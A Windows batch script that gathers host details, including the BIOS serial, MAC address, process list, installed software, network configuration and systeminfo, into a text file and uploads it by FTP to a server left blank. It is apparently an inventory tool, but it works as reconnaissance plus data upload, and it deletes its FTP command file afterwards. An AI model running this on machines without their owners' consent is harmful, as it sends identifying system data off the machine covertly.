@echo off
set DesktopDir=%USERPROFILE%\Desktop
set OutputFile=C:\Users\%UserName%\Documents\output.txt
echo Serial Number---------------------------------------------- >> "%OutputFile%"
wmic bios get serialnumber >> "%OutputFile%"
echo. >> "%OutputFile%"
echo MAC-------------------------------------------------------- >> "%OutputFile%" 
getmac >> "%OutputFile%"
echo. >> "%OutputFile%"
echo CPU Information-------------------------------------------- >> "%OutputFile%"
wmic cpu >> "%OutputFile%"
wmic cpu get caption, name, deviceid, numberofcores, maxclockspeed, status >> "%OutputFile%"
echo. >> "%OutputFile%"
echo Disk Partition---------------------------------------------- >> "%OutputFile%"
wmic partition get name,size,type >> "%OutputFile%"
echo. >> "%OutputFile%"
echo Process List------------------------------------------------ >> "%OutputFile%"
wmic process list >> "%OutputFile%"
echo. >> "%OutputFile%"
echo Command for terminating processes--------------------------- >> "%OutputFile%"
echo wmic process where name="name_of_file" call terminate >> "%OutputFile%"
echo. >> "%OutputFile%"
echo Product Information----------------------------------------- >> "%OutputFile%"
wmic product >> "%OutputFile%"
echo. >> "%OutputFile%"
echo IP----------------------------------------------------- >> "%OutputFile%"
ipconfig /all >> "%OutputFile%"
echo. >> "%OutputFile%"
echo System Info------------------------------------------------- >> "%OutputFile%"
systeminfo >> "%OutputFile%"
cd C:\Users\%UserName%\Documents
set FTPServer=
set FTPUser=
set FTPPass=
set LocalFile=output.txt
set RemoteDir=/
set RemoteFile=output.txt

echo open %FTPServer% > ftp.txt
echo %FTPUser% >> ftp.txt
echo %FTPPass% >> ftp.txt
echo binary >> ftp.txt
echo cd %RemoteDir% >> ftp.txt
echo passive >> ftp.txt
echo put %LocalFile% %RemoteFile% >> ftp.txt
echo quit >> ftp.txt

ftp -s:ftp.txt
del ftp.txt

echo DONE!
pause >nul